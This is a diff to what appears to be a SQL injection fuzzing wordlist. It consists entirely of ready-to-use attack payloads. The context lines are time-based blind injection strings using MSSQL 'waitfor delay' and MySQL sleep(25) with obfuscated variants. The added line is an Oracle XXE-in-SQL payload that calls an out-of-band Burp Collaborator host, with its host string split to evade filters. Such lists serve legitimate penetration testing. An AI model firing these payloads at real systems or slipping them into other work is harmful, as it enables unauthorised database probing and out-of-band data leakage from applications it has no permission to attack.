@@ -19,3 +19,4 @@ AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--
 %2b(select*from(select(sleep(25)))a)%2b'
 /**/xor/**/sleep(25)
 or (sleep(25)+1) limit 1 --
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % pekop SYSTEM "http://<burp-colab-url>.oasti'||'fy.com/">%pekop;]>'),'/l') from dual)||'
